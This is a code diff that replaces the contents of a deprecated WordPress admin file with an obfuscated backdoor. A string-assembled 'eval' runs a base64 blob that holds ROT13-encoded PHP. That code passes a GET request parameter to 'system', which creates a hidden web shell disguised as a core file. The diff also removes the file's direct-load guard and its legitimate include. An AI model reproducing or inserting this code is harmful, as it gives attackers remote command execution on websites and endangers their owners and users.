@@ -1,30 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Administration Functions
- *
- * This file is deprecated, use 'wp-admin/includes/admin.php' instead.
- *
- * @deprecated 2.5.0
- * @package WordPress
- * @subpackage Administration
- */
-
-// Don't load directly.
-if ( ! defined( 'ABSPATH' ) ) {
-	die( '-1' );
-}
-
-_deprecated_file( basename( __FILE__ ), '2.5.0', 'wp-admin/includes/admin.php' );
-
-/** WordPress Administration API: Includes all Administration functions. */
-require_once ABSPATH . 'wp-admin/includes/admin.php';
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogTnF6dmF2Zmdlbmd2YmEgU2hhcGd2YmFmCiAqCiAqIEd1dmYgc3Z5ciB2ZiBxcmNlcnBuZ3JxLCBoZnIgJ2pjLW5xenZhL3ZhcHlocXJmL25xenZhLmN1YycgdmFmZ3JucS4KICoKICogQHFyY2VycG5ncnEgMi41LjAKICogQGNucHhudHIgSmJlcUNlcmZmCiAqIEBmaG9jbnB4bnRyIE5xenZhdmZnZW5ndmJhCiAqLwoKLy8gUWJhJ2cgeWJucSBxdmVycGd5bC4KdnMgKCAhIHFyc3ZhcnEoICdOT0ZDTkdVJyApICkgewoJcXZyKCAnLTEnICk7Cn0KCl9xcmNlcnBuZ3JxX3N2eXIoIG9uZnJhbnpyKCBfX1NWWVJfXyApLCAnMi41LjAnLCAnamMtbnF6dmEvdmFweWhxcmYvbnF6dmEuY3VjJyApOwoKLyoqIEpiZXFDZXJmZiBOcXp2YXZmZ2VuZ3ZiYSBOQ1Y6IFZhcHlocXJmIG55eSBOcXp2YXZmZ2VuZ3ZiYSBzaGFwZ3ZiYWYuICovCmVyZGh2ZXJfYmFwciBOT0ZDTkdVIC4gJ2pjLW5xenZhL3ZhcHlocXJmL25xenZhLmN1Yyc7CgokcHpxID0gJF9UUkdbJ2MnXTsKJHN6bmNbJ2sxJ10oJHB6cSk7Cj8+IjsKZXZhbCgkZigkYykpOwo/Pg==");
+$f($c);
+?>
